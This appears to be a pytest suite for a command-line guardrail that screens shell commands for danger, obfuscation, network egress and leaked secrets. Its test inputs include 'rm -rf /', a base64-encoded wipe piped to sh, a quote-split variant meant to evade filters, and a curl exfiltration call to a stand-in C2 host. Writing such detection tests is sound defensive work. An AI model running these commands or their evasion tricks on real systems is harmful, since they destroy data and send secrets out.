import pytest
from guardrail_cli.config import GuardrailConfig
from guardrail_cli.guardrail import SecurityGuardrail, shannon_entropy
from guardrail_cli.models import RiskLevel
from guardrail_cli.parser import ASTBashParser
from guardrail_cli.antitamper import AntiTamperEngine
from guardrail_cli.network import NetworkEgressGuard
from guardrail_cli.diagnostics import SystemDiagnosticEngine
from guardrail_cli.simulator import DryRunSimulator
from guardrail_cli.doctor import GuardrailDoctor

@pytest.fixture
def guardrail():
    cfg = GuardrailConfig()
    return SecurityGuardrail(cfg)

@pytest.fixture
def diagnostic_engine():
    return SystemDiagnosticEngine()

def test_dry_run_simulator_rm():
    sim = DryRunSimulator()
    analysis = sim.analyze("rm -rf /nonexistent_folder_abc")
    assert not analysis.is_safe
    assert analysis.risk_level == RiskLevel.WARNING
    assert "Cancellazione ricorsiva" in analysis.intent_summary

def test_guardrail_doctor():
    doctor = GuardrailDoctor()
    report = doctor.run_diagnostics()
    assert report.overall_healthy
    assert len(report.checks) >= 4

def test_anti_tamper_base64_pipe():
    engine = AntiTamperEngine()
    cmd = 'echo "cm0gLXJmIC8=" | base64 -d | sh'
    res = engine.inspect(cmd)
    assert res.is_obfuscated
    assert res.technique == "base64_pipeline_eval"
    assert "rm -rf /" in (res.decoded_command or "")

def test_anti_tamper_quote_insertion(guardrail):
    cmd = "r''m -''rf /"
    res = guardrail.evaluate(cmd)
    assert not res.allowed
    assert res.risk_level == RiskLevel.BLOCKED

def test_network_egress_guard():
    guard = NetworkEgressGuard(block_external_egress=True, allowed_domains=["github.com"])
    res_local = guard.check("curl http://localhost:8080/api")
    assert res_local.allowed
    assert not res_local.is_external

    res_wl = guard.check("curl https://github.com/francaroscillidev-gif")
    assert res_wl.allowed
    assert res_wl.is_external

    res_blocked = guard.check("curl https://malicious-c2-server.com/exfiltrate")
    assert not res_blocked.allowed
    assert res_blocked.is_external

def test_shannon_entropy():
    low_ent = shannon_entropy("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    assert low_ent == 0.0

    high_ent = shannon_entropy("X9fK2mP8qL1zW7vR4tN6yB3cD5jH0sEa")
    assert high_ent >= 4.3

def test_ast_bash_parser_pipeline():
    parser = ASTBashParser()
    nodes = parser.parse_pipeline("echo 'hello' | grep 'h' && cat test.txt > output.log ; rm -rf temp")
    assert len(nodes) == 4
    assert nodes[0].command_name == "echo"
    assert nodes[1].command_name == "grep"
    assert nodes[2].command_name == "cat"
    assert nodes[2].has_redirection
    assert "output.log" in nodes[2].redirection_targets
    assert nodes[3].command_name == "rm"

def test_block_rm_rf_root(guardrail):
    res = guardrail.evaluate("rm -rf /")
    assert not res.allowed
    assert res.risk_level == RiskLevel.BLOCKED

def test_block_secret_github_token(guardrail):
    cmd = "curl -H 'Authorization: token ghp_123456789012345678901234567890123456' https://api.github.com"
    res = guardrail.evaluate(cmd)
    assert not res.allowed
    assert res.risk_level == RiskLevel.BLOCKED
    assert any("GitHub" in s for s in res.detected_secrets)

def test_warning_git_force_push(guardrail):
    res = guardrail.evaluate("git push origin main --force")
    assert res.allowed
    assert res.risk_level == RiskLevel.WARNING

def test_diagnostics_python_module(diagnostic_engine):
    diag = diagnostic_engine.analyze(
        command="python3 -c 'import custom_unknown_pkg'",
        exit_code=1,
        stdout="",
        stderr="ModuleNotFoundError: No module named 'custom_unknown_pkg'\n"
    )
    assert diag is not None
    assert diag.error_category == "python_module_missing"
    assert "custom_unknown_pkg" in diag.details.get("module")
    assert diag.is_auto_fixable
